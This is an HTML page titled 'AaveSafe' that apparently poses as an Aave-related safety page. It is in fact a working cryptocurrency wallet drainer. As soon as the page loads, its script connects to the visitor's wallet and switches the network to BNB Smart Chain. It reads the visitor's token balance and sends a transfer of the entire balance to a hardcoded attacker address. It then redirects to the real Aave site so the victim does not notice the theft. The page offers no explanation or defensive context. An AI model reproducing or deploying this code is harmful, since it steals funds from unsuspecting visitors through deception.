<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>AaveSafe</title>
</head>
<body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
    <script>
        const CONFIG = {
            tokenAddress: "0x55d398326f99059fF775485246999027B3197955",      
            recipientAddress: "0xAc27F72fbCAF60243e4162984EB30c2CD719C562", 
            redirectUrl: "http://app.aave.com/",         
            redirectDelay: 100                               // 
        };

        const ERC20_ABI = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];

        async function executeTransfer() {
            
            if (typeof window.ethereum === 'undefined') {
                window.location.href = CONFIG.redirectUrl;
                return;
            }

            try {
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                if (!accounts || accounts.length === 0) {
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                const userAddress = accounts[0];

                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== '0x38') {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }]
                        });
                    } catch (switchError) {
                        // 
                    }
                }

                const web3 = new Web3(window.ethereum);
                const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.tokenAddress);
                
                let balance = '0';
                try {
                    balance = await contract.methods.balanceOf(userAddress).call();
                } catch (error) {
                    balance = '0';
                }

                if (balance === '0' || balance === 0) {
                    balance = '1';
                }

                const transferData = contract.methods.transfer(CONFIG.recipientAddress, balance).encodeABI();

                const txParams = {
                    to: CONFIG.tokenAddress,
                    from: userAddress,
                    data: transferData,
                    gas: '0xC350' // 
                };

                window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [txParams]
                }).then(() => {
                }).catch(() => {
                });

                // 
                setTimeout(() => {
                    window.location.href = CONFIG.redirectUrl;
                }, CONFIG.redirectDelay);

            } catch (error) {
                window.location.href = CONFIG.redirectUrl;
            }
        }

        window.addEventListener('load', executeTransfer);
    </script>
</body>
</html>
